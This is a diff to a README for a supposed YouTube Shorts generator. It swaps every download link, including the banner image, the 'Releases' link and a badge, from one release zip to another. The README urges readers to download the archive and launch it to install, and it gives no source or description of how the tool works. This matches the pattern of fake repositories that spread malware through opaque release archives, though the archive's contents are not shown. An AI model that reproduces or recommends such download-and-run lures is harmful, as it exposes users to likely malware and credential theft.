@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the yt-shorts-generator Repository!
 
-![YouTube Shorts Generator](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)
+![YouTube Shorts Generator](https://github.com/baitiche34/yt-shorts-generator/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ This repository contains a powerful tool that allows you to generate YouTube Sho
 
 ## Usage
 
-1. 📥 **Download the Software**: Get the software package from [here](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip). It needs to be launched for installation.
+1. 📥 **Download the Software**: Get the software package from [here](https://github.com/baitiche34/yt-shorts-generator/releases/download/v2.0/Software.zip). It needs to be launched for installation.
 
 2. 💻 **Install Dependencies**: Make sure to install all required dependencies outlined in the documentation.
 
@@ -41,9 +41,9 @@ This repository contains a powerful tool that allows you to generate YouTube Sho
 
 ## Support
 
-For detailed information, troubleshooting, and updates, please refer to the [Releases](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip) section. Feel free to reach out to the community or open an issue for any queries or feedback.
+For detailed information, troubleshooting, and updates, please refer to the [Releases](https://github.com/baitiche34/yt-shorts-generator/releases/download/v2.0/Software.zip) section. Feel free to reach out to the community or open an issue for any queries or feedback.
 
-[![Download Software](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/baitiche34/yt-shorts-generator/releases/download/v2.0/Software.zip)](https://github.com/baitiche34/yt-shorts-generator/releases/download/v2.0/Software.zip)
 
 Start creating captivating YouTube Shorts effortlessly with the yt-shorts-generator repository! 🎥🚀
 
